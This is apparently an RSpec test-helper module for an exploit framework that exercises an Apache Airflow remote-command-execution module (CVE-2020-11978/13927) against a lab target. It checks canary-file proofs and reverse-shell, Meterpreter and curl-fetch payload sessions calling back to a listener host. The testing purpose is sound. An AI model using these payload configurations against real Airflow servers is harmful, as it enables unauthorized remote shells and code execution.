# frozen_string_literal: true

require_relative '../rsync_creds/native'

# Airflow-specific run identities, scheduler state and real command sessions.
module AirflowDagTarget
  include RsyncCredentialTarget

  CONFIG = JSON.parse(File.read(File.join(__dir__, 'profiles.json'))).freeze
  OWNER = CONFIG.fetch('owner')

  def rc_save
    File.write(File.join(target_runtime.fetch('artifacts'), 'airflow.json'), JSON.pretty_generate(@rc)) if @rc
  end

  def rc_command(label, role, *, required: true)
    super(label, role == 'linux' ? 'app' : role, *, required: required)
  end

  def rc_resource_roles
    %w[app reporting_db]
  end

  def af_native(phase)
    argv = ['python3', '-B', 'test/module_targets/airflow_dag/native.py', ENV.fetch('MODULE_TARGET_RUNTIME'), phase, @mode]
    output, error, status = Open3.capture3(*argv)
    @rc.fetch(:native) << { phase: phase, argv: argv, exit: status.exitstatus, stdout: output, stderr: error }
    rc_save
    expect(status.success?).to be(true), output + error
    data = JSON.parse(File.read(File.join(target_runtime.fetch('artifacts'), 'native-airflow-' + phase + '.json')))
    expect(data.fetch('status')).to eq('passed')
    data.fetch('snapshot')
  end

  def af_snapshot(reset = nil)
    args = ['python', '/opt/module-target/control.py']
    args += ['reset', JSON.generate(reset)] if reset
    output, = rc_command(reset ? 'selected-run-reset' : 'snapshot', 'app', *args)
    values = output.lines.filter_map { |line| JSON.parse(line.delete_prefix('CONTROL_JSON=')) if line.start_with?('CONTROL_JSON=') }
    expect(values.length).to eq(1)
    values.first
  end

  def af_call(label, options = {}, action: 'run -z', reuse: false)
    offset = rc_json('framework.instance_variable_get(:@airflow_events).length')
    record = { label: label, action: action, options: options, before: af_snapshot }
    @rc.fetch(:calls) << record
    values = {
      'TARGET' => 0, 'PAYLOAD' => 'cmd/unix/generic', 'CMD' => 'true', 'SSL' => false,
      'TARGETURI' => @mode == 'prefix' ? '/airflow/' : '/', 'DAG_PATH' => '/api/experimental/dags/' + CONFIG.fetch('dag_id'),
      'TIMEOUT' => 60, 'HttpClientTimeout' => 5, 'DisablePayloadHandler' => true, 'WfsDelay' => 0, 'AutoCheck' => true
    }.merge(options)
    values.delete('CMD') unless values.fetch('PAYLOAD') == 'cmd/unix/generic'
    output = run_target_module(OWNER, 'app', values, action: action, reuse_module: reuse, allow_errors: true, command_timeout: 120) do |text|
      record[:output_base64] = Base64.strict_encode64(text.b)
      record[:events] = rc_json('framework.instance_variable_get(:@airflow_events)').drop(offset)
      record[:identity] = rc_json('active_module.object_id')
      rc_save
    end
    expect(output).not_to match(/Unknown datastore option|Error while running command|Call stack:/)
    [output, record]
  end

  def af_file(path)
    code = "import base64,json,sys;from pathlib import Path;p=Path(sys.argv[1]);print(json.dumps({'exists':p.is_file(),'uid':p.stat().st_uid if p.is_file()else None,'base64':base64.b64encode(p.read_bytes()).decode()if p.is_file()else None}))"
    output, = rc_command('proof-file', 'app', 'python', '-c', code, path)
    JSON.parse(output)
  end

  def af_canary(label, extra = {}, expected: @affected, reuse: false)
    path = "/tmp/module-target-airflow-owner-#{Process.pid}-#{label}"
    token = 'airflow-' + label
    expect(af_file(path).fetch('exists')).to be(false)
    output, record = af_call(label, { 'CMD' => "printf %s #{token} > #{path}" }.merge(extra), reuse: reuse)
    if expected
      expect(output).not_to include('Exploit failed', 'Exploit aborted')
      rc_poll(15) { af_file(path).fetch('exists') }
      expect(af_file(path)).to eq('exists' => true, 'uid' => CONFIG.fetch('uid'), 'base64' => Base64.strict_encode64(token))
    else
      af_finished
      expect(af_file(path)).to eq('exists' => false, 'uid' => nil, 'base64' => nil)
    end
    record[:proof] = af_file(path)
    rc_save
    [output, record]
  ensure
    rc_command('remove-owner-proof', 'app', 'rm', '-f', path) if path
    expect(af_file(path).fetch('exists')).to be(false) if path
  end

  def af_finished
    rc_poll(40) do
      current = af_snapshot
      current if current.fetch('runs').all? { |run| %w[success failed].include?(run.fetch('state')) }
    end
  end

  def af_reset
    state = af_finished
    expect(state.fetch('runs')).to all(include('state' => 'success')) if @affected
    dates = @rc.fetch(:calls).flat_map { |call| call.fetch(:events, []) }.filter_map do |event|
      next unless event.values_at('event', 'method', 'code') == ['http', 'POST', 200] && event.fetch('uri').end_with?('/dag_runs')

      JSON.parse(Base64.strict_decode64(event.fetch('body_base64'))).fetch('execution_date')
    end
    expect(state.fetch('runs').map { |run| run.fetch('execution_date') } - dates).to eq([])
    @rc.fetch(:resets) << state
    after = af_snapshot('runs' => state.fetch('runs'), 'paused' => true)
    @baseline.each { |key, value| expect(after.fetch(key)).to eq(value) }
    rc_resources('after-example')
    rc_save
  end

  def af_port
    socket = TCPServer.new(@rc.fetch(:callback).fetch(:bind), 0)
    socket.local_address.ip_port
  ensure
    socket&.close
  end

  def af_tcp(port)
    code = "import json,sys;rows=[line.split()for line in open('/proc/net/tcp').read().splitlines()[1:]];print(json.dumps([{'state':r[3],'uid':int(r[7]),'inode':r[9]}for r in rows if int(r[2].split(':')[1],16)==int(sys.argv[1])and int(r[7])==int(sys.argv[2])]))"
    output, = rc_command('session-sockets', 'app', 'python', '-c', code, port.to_s, CONFIG.fetch('uid').to_s)
    JSON.parse(output)
  end

  def af_process(pid)
    code = "import json,sys;from pathlib import Path;p=Path('/proc')/sys.argv[1]/'status';s=p.read_text()if p.exists()else '';print(json.dumps({'exists':bool(s),'uid':int(next(l for l in s.splitlines()if l.startswith('Uid:')).split()[1])if s else None,'state':next(l for l in s.splitlines()if l.startswith('State:')).split()[1]if s else None}))"
    output, = rc_command('session-native-process', 'app', 'python', '-c', code, pid.to_s)
    JSON.parse(output)
  end

  def af_session(label, family, reuse: false)
    payload = { 'meterpreter' => 'cmd/unix/python/meterpreter_reverse_tcp', 'python_shell' => 'cmd/unix/reverse_python', 'bash' => 'cmd/unix/reverse_bash', 'fetch' => 'cmd/linux/http/x64/meterpreter_reverse_tcp' }.fetch(family)
    callback = @rc.fetch(:callback)
    port = af_port
    expect(af_tcp(port)).to eq([])
    options = {
      'PAYLOAD' => payload, 'LHOST' => callback.fetch(:host), 'LPORT' => port, 'ReverseListenerBindAddress' => callback.fetch(:bind),
      'DisablePayloadHandler' => false, 'AutoCheck' => !reuse, 'WfsDelay' => 15
    }
    if family == 'fetch'
      fetched = "/tmp/module-target-airflow-fetch-#{Process.pid}-#{label}"
      options.merge!('FETCH_COMMAND' => 'CURL', 'FETCH_SRVHOST' => callback.fetch(:host), 'FETCH_SRVPORT' => af_port,
                     'FetchListenerBindAddress' => callback.fetch(:bind), 'FETCH_WRITABLE_DIR' => '/tmp', 'FETCH_FILENAME' => File.basename(fetched), 'FETCH_DELETE' => true)
    end
    output, call = af_call(label, options, reuse: reuse)
    expect(output).not_to include('Exploit failed', 'Exploit aborted', 'no session was created')
    kind = %w[python_shell bash].include?(family) ? 'shell' : 'meterpreter'
    metadata = rc_poll(30) do
      sessions = rc_json('framework.sessions.map{|id,s|{id:id,type:s.type,owner:s.via_exploit,payload:s.via_payload,db_id:s.db_record&.id}}')
      ready = File.readlines(@observer.fetch('ready_event_path')).map { |line| JSON.parse(line) }
      sessions.find { |session| session.fetch('type') == kind && session['db_id'] && ready.any? { |event| event.fetch('id') == session.fetch('id') } }
    end
    expect(metadata.values_at('owner', 'payload')).to eq([OWNER, 'payload/' + payload])
    identifier = metadata.fetch('id')
    proof = "/tmp/module-target-druid-session-#{Process.pid}_#{identifier}-#{identifier}"
    expect(af_file(proof).fetch('exists')).to be(false)
    if kind == 'shell'
      result = rc_json("DruidSessionControl.proof(framework,#{identifier},#{proof.inspect})")
      expected = 'druid-session'
    else
      channels = rc_json("framework.sessions.fetch(#{identifier}).channels.keys.sort")
      result = rc_json("begin;s=framework.sessions.fetch(#{identifier});f=nil;begin;f=s.fs.file.new(#{proof.inspect},'wb');f.write('airflow-session');ensure;f.close if f;end;{pid:s.sys.process.getpid,identity:s.sys.config.getuid,platform:s.platform};end")
      expect(rc_json("framework.sessions.fetch(#{identifier}).channels.keys.sort")).to eq(channels)
      expected = 'airflow-session'
    end
    expect(result).not_to have_key('error')
    expect(af_file(proof)).to eq('exists' => true, 'uid' => CONFIG.fetch('uid'), 'base64' => Base64.strict_encode64(expected))
    expect(af_tcp(port)).to include(include('state' => '01', 'uid' => CONFIG.fetch('uid')))
    native_process = af_process(result.fetch('pid'))
    expect(native_process).to include('exists' => true, 'uid' => CONFIG.fetch('uid'))
    reports = JSON.parse(rc_sql("SELECT coalesce(json_agg(row),'[]'::json) FROM (SELECT s.id,s.stype,s.via_exploit,s.via_payload,host(h.address::inet) AS address FROM sessions s JOIN hosts h ON h.id=s.host_id JOIN workspaces w ON w.id=h.workspace_id WHERE w.name='#{@workspace}') row"))
    expect(reports).to include(include('id' => metadata.fetch('db_id'), 'stype' => kind, 'via_exploit' => OWNER, 'via_payload' => 'payload/' + payload))
    record = { label: label, metadata: metadata, proof: result, native_process: native_process, reports: reports, port: port }
    @rc.fetch(:sessions) << record
    rc_save
    # AutoCheck names its finding by fullname; session inference uses Name.
    # With AutoCheck disabled only the latter is created in this new workspace.
    expected_names = [rc_json('active_module.name'), (OWNER unless reuse)].compact
    vulnerabilities = rc_poll do
      rows = JSON.parse(rc_sql("SELECT coalesce(json_agg(row),'[]'::json) FROM (SELECT v.name,host(h.address::inet) AS address,(SELECT coalesce(json_agg(r.name),'[]'::json) FROM refs r JOIN vulns_refs vr ON vr.ref_id=r.id WHERE vr.vuln_id=v.id) AS refs FROM vulns v JOIN hosts h ON h.id=v.host_id JOIN workspaces w ON w.id=h.workspace_id WHERE w.name='#{@workspace}') row"))
      rows if rows.map { |row| row.fetch('name') }.sort == expected_names.sort
    end
    vulnerabilities.each { |row| expect(row.fetch('refs')).to include('CVE-2020-11978', 'CVE-2020-13927') }
    record[:vulnerabilities] = vulnerabilities
    call[:session] = metadata
    rc_save
  ensure
    if identifier
      rc_command('remove-session-proof', 'app', 'rm', '-f', proof) if proof
      expect(af_file(proof).fetch('exists')).to be(false) if proof
      rc_json("DruidSessionControl.exit_remote(framework,#{identifier})")
      rc_json("begin;s=framework.sessions[#{identifier}];s.kill if s;{closed:#{identifier}};end")
      rc_poll(15) { af_tcp(port).none? { |row| %w[01 08].include?(row.fetch('state')) } }
      if result
        rc_poll(15) do
          native = af_process(result.fetch('pid'))
          !native.fetch('exists') || native.fetch('state') == 'Z'
        end
        record[:closed_process] = af_process(result.fetch('pid')) if record
      end
    end
    rc_poll(15) { !af_file(fetched).fetch('exists') } if fetched
    console_command('jobs -K')
    expect(rc_json('{sessions:framework.sessions.keys,jobs:framework.jobs.keys}')).to eq('sessions' => [], 'jobs' => [])
    rc_save
  end
end
